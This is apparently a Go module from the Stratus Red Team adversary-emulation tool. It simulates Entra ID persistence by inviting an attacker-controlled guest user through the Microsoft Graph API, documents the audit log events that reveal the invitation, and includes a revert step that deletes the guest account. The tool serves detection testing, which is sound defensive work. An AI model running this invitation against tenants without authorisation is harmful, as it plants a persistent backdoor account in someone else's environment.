package azure

import (
	"context"
	_ "embed"
	"errors"
	"fmt"
	entra_id_utils "github.com/datadog/stratus-red-team/v2/internal/utils/entra_id"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
	"log"
	"strings"
)

const codeBlock = "```"
const AttackTechniqueId = "entra-id.persistence.guest-user"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "entra-id.persistence.guest-user",
		FriendlyName: "Create Guest User for Persistent Access",
		Description: `
An attacker can abuse the Guest User invite process to gain persistent access to an environment, as they can invite themselves as a guest.

Warm-up:

- N/A, this technique does not have a warm-up stage

Detonation:

- Invite Guest User

References:

- https://securitylabs.datadoghq.com/cloud-security-atlas/attacks/inviting-external-users/
- https://derkvanderwoude.medium.com/azure-subscription-hijacking-and-cryptomining-86c2ac018983
- https://dirkjanm.io/assets/raw/US-22-Mollema-Backdooring-and-hijacking-Azure-AD-accounts_final.pdf

!!! note

	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team creates a guest user with the e-mail ` + entra_id_utils.DefaultFictitiousAttackerEmail + ` by default.
	This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can (and should) override
	this behavior by setting the environment variable <code>` + entra_id_utils.AttackerEmailEnvVarKey + `</code>, for instance:

	` + codeBlock + `bash
	export ` + entra_id_utils.AttackerEmailEnvVarKey + `="you@domain.tld"
	stratus detonate ` + AttackTechniqueId + `
	` + codeBlock + `
`,
		Detection: `
When someone invites a guest user in Entra ID, several events are logged in the Entra ID Activity logs:

<code>Add user</code>
<code>Invite external user</code>
<code>Add user sponsor</code>

When the invited user accepts the invite, an additional event <code>Redeem external user invite</code> is logged. 

Sample events, shortened for clarity:` + codeBlock + `
{
  "category": "UserManagement",
  "result": "success",
  "activityDisplayName": "Invite external user",
  "loggedByService": "Invited Users",
  "initiatedBy": {
    "user": {
      "userPrincipalName": "<inviter@tenant.tld>",
    }
  },
  "userAgent": "",
  "targetResources": [
    {
      "displayName": "<invited user display name>",
      "type": "User",
      "userPrincipalName": "<invited-user-email>#EXT#@<tenant.tld>",
      "groupType": null,
      "modifiedProperties": []
    }
  ],
  "additionalDetails": [
    {
      "key": "invitedUserEmailAddress",
      "value": "<invited-user-email>"
    }
  ]
}
{
  "category": "UserManagement",
  "result": "success",
  "resultReason": null,
  "activityDisplayName": "Redeem external user invite",
  "loggedByService": "B2B Auth",
  "initiatedBy": {
    "user": {
      "userPrincipalName": "<invited-user-email>",
      "ipAddress": "<invited-user-ip>"
    }
  },
  "targetResources": [
    {
      "id": "d042c4fe-5dd1-44a2-883a-eede6c10608f",
      "displayName": "UPN: <invited-user-email>#EXT#<tenant.tld>, Email: <invited-user-email>, InvitationId: 4c93fc70-169a-411f-8cf7-aff732f8c7b9, Source: One Time Passcode",
      "type": "User",
      "userPrincipalName": "<invited-user-email>#EXT#<tenant.tld>"
    }
  ]
}
` + codeBlock + `
`,
		Platform:           stratus.EntraID,
		IsIdempotent:       false,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence},
		Detonate:           detonate,
		Revert:             revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	//graphClient setup
	graphClient := providers.EntraId().GetGraphClient()
	attackerPrincipal := entra_id_utils.GetAttackerPrincipal()

	// Fetch Tenant Id
	organization, err := graphClient.Organization().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not get tenant ID: " + err.Error())
	}

	tenantId := organization.GetValue()[0].GetId()

	// Invite Guest User
	requestBody := graphmodels.NewInvitation()
	invitedUserEmailAddress := attackerPrincipal
	requestBody.SetInvitedUserEmailAddress(&invitedUserEmailAddress)
	inviteRedirectUrl := fmt.Sprintf("https://myapplications.microsoft.com/?tenantid=%s", *tenantId)
	requestBody.SetInviteRedirectUrl(&inviteRedirectUrl)

	_, err = graphClient.Invitations().Post(context.Background(), requestBody, nil)

	if err != nil {
		return errors.New("could not invite user: " + err.Error())
	}

	log.Printf("Invited %s as guest user", attackerPrincipal)

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	// Initialize Graph client
	graphClient := providers.EntraId().GetGraphClient()
	attackerPrincipal := entra_id_utils.GetAttackerPrincipal()
	attackerPrefix := strings.Split(attackerPrincipal, "@")

	// 1. Get ID of invited Guest User
	userResult, err := graphClient.Users().Get(context.Background(), nil)
	if err != nil {
		return errors.New("could not retrieve users: " + err.Error())
	}

	var userId string
	for _, user := range userResult.GetValue() {
		userPrincipal := *user.GetUserPrincipalName()
		if strings.Contains(userPrincipal, attackerPrefix[0]) {
			userId = *user.GetId()
			break
		}
	}

	// 2. Delete Guest User
	err = graphClient.Users().ByUserId(userId).Delete(context.Background(), nil)
	if err != nil {
		return errors.New("could not delete guest user: " + err.Error())
	}

	log.Printf("Deleted guest user %s", attackerPrincipal)

	return nil
}
